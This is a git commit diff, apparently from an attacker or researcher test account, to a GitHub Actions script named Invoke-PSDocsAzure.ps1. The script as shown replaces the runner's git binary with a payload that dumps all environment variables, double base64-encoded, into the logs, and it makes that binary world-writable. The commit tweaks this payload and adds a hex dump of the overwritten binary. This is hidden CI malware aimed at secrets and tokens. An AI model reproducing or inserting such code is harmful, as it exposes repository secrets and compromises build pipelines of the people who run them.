376cf76ce814f72ffb9fa5fe4210bec777db9294
clem-atk <clement.notin+githubattacker@gmail.com>
2024-09-04 18:13:16 +0200

    Update Invoke-PSDocsAzure.ps1

--- .github/scripts/Invoke-PSDocsAzure.ps1
+++ .github/scripts/Invoke-PSDocsAzure.ps1
@@ -11,13 +11,10 @@ env
 echo ----
 env |base64 -w0 |base64 -w0
 echo ----
-
-for word in \"\$@\"; do echo \$word; done
-
 "@
 
 $gitPath = & which git
 sudo chmod 777 $gitPath
 
 Set-Content -Path $gitPath -Value $content
-
+Format-Hex -path $gitPath
